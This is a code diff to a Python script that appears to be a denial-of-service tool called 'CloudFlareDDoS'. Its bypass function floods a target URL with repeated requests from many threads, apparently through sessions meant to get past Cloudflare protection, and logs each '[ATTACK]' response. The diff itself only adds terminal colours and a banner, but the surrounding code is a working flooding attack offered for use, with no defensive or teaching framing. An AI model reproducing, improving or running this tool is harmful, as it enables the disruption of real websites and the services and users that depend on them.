@@ -33,10 +33,10 @@ def bypass(url, threads):
             response = r.get(url)
             count +=1
 
-            print("\n" + f"[ATTACK] Status Code : {response.status_code} Request Number: {count}" + "\n")
+            print("\033[90m\n" + f"[ATTACK] Status Code : {response.status_code} Request Number: {count}" + "\n\033[0m")
 
             response = bypass2.get(url)
-            print("\n" + f"[ATTACK] Status Code : {response.status_code} Request Number: {count}" + "\n")
+            print("\033[90m\n" + f"[ATTACK] Status Code : {response.status_code} Request Number: {count}" + "\n\033[0m")
 
     list_of_threads = []
 
@@ -55,6 +55,7 @@ def bypass(url, threads):
         list_of_threads[i].join()
 
 print(" ")
+print("\033[90m----------------------------CloudFlareDDoS--------------------------------- \033[0m")
 print("\033[91m   ________                __________                ____  ____       _____ \033[0m")
 print("\033[92m  / ____/ /___  __  ______/ / ____/ /___ _________  / __ \/ __ \____ / ___/ \033[0m")
 print("\033[93m / /   / / __ \/ / / / __  / /_  / / __ `/ ___/ _ \/ / / / / / / __ \\__ \  \033[0m")
